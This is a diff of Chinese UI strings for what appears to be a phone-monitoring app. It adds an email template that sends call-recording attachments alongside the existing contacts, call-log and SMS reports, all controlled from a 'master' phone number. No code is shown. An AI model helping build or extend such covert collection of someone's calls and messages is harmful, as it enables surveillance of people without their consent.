@@ -41,7 +41,8 @@
     <!-- Mail -->
     <string name="mail_from">来自</string>
     <string name="mail_description">（内附联系人，电话，短信记录）</string>
-    <string name="mail_body">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
+    <string name="mail_body_info">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
+    <string name="mail_body_record">你好，这是来自%s的自动发信，附件是录音文件。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
     
     <!-- Location -->
     <string name="location_sms_real">当前位置（纬度，经度）：%s。去maps.google.com看地图</string>
@@ -131,7 +132,7 @@
     <string name="indication_set_selfsender_ok">设置送信邮箱成功。</string>
     <string name="indication_set_selfsender_ng">设置送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_stop_selfsender_ok">取消送信邮箱成功。</string>
-    <string name="indication_stop_selfsender_ng">取消送信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_stop_selfsender_ng">取消送信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有送信邮箱。若无法解决请联系客服。</string>
     <string name="indication_set_recv_mail_ok">设置收信邮箱成功。</string>
     <string name="indication_set_recv_mail_ng">设置收信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_set_recv_phonenum_ok">设置主控手机号码成功。</string>
